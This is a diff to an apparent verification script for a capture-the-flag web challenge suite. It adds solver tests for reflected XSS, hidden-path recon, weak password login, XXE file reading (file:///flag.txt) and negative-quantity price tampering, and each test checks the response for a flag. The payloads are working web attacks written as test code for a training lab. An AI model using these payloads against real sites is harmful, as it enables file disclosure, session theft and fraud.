@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Master Verification Script for 10-Challenge CTF Web Suite
+Master Verification Script for 15-Challenge CTF Web Suite
 """
 import sys
 import re
@@ -71,6 +71,38 @@ def test_ssti():
     with urllib.request.urlopen(req) as res:
         return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
 
+def test_xss():
+    url = f"{BASE_URL}/xss_reflected/?q=%3Cscript%3Ealert(1)%3C/script%3E"
+    with urllib.request.urlopen(url) as res:
+        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
+
+def test_robots():
+    url = f"{BASE_URL}/robots_secret/hidden_staging_backup_2026/"
+    with urllib.request.urlopen(url) as res:
+        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
+
+def test_weak_hash():
+    url = f"{BASE_URL}/weak_hash/login"
+    data = urllib.parse.urlencode({'password': 'password123'}).encode()
+    req = urllib.request.Request(url, data=data)
+    with urllib.request.urlopen(req) as res:
+        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
+
+def test_xxe():
+    url = f"{BASE_URL}/xxe_lab/"
+    payload = '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]><data>&xxe;</data>'
+    data = urllib.parse.urlencode({'xml_data': payload}).encode()
+    req = urllib.request.Request(url, data=data)
+    with urllib.request.urlopen(req) as res:
+        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
+
+def test_logic():
+    url = f"{BASE_URL}/logic_shop/"
+    data = urllib.parse.urlencode({'quantity': '-10'}).encode()
+    req = urllib.request.Request(url, data=data)
+    with urllib.request.urlopen(req) as res:
+        return bool(re.search(r'CTF\{[A-Za-z0-9_]+\}', res.read().decode()))
+
 if __name__ == '__main__':
     tests = [
         ("SQLi Auth Bypass", test_sqli),
@@ -82,9 +114,14 @@ if __name__ == '__main__':
         ("SSRF Internal Access", test_ssrf),
         ("JWT Algorithm None", test_jwt),
         ("Jinja2 SSTI WAF Bypass", test_ssti),
+        ("Reflected XSS", test_xss),
+        ("Robots.txt Recon", test_robots),
+        ("MD5 Hash Cracking", test_weak_hash),
+        ("XML External Entity (XXE)", test_xxe),
+        ("Business Logic Price Tampering", test_logic),
     ]
     
-    print(f"[*] Testing 10-Challenge CTF Web Suite against {BASE_URL}...\n")
+    print(f"[*] Testing 15-Challenge CTF Web Suite against {BASE_URL}...\n")
     passed = 0
     for name, test_fn in tests:
         try:
